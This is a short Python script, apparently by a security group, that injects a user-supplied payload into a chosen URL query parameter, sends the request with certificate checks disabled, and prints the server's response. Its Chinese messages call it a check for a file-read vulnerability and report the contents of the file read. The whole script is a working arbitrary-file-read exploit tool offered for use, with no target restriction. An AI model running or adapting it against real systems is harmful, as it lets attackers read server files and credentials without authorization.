#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re
import urllib

urllib3.disable_warnings()

#将 payload 插入 url 中
def mage_payload(url, vp, payload):
    uri, pdata = url.split("?")
    info =  urllib.parse.unquote(pdata)
    print(info)
    temp_list = []
    for item in info.split("&"):
        #print(item)
        try:
            parmas, data = item.split("=")
        except:
            parmas  = item.split("=")[0]
            data = ""
        if parmas == vp:
            data = payload
        temp_list.append(parmas+"="+data)
    return uri + "?" + "&".join(temp_list)

def verify(url, parmas, payload):
    burp0_url = mage_payload(url, parmas, payload)
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Content-Type": "application/json"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    if r.status_code == 200:
        return r.text[:1000]
    return ""

    
if __name__=="__main__":
    target = sys.argv[1]
    payload = sys.argv[2]
    parmas = sys.argv[3]
    info = verify(target, parmas, payload)
    if info != "":
        print("[+]漏洞存在, 读取文件", payload, " 的结果为：", info)
    else:
        print("[-]漏洞不存在")
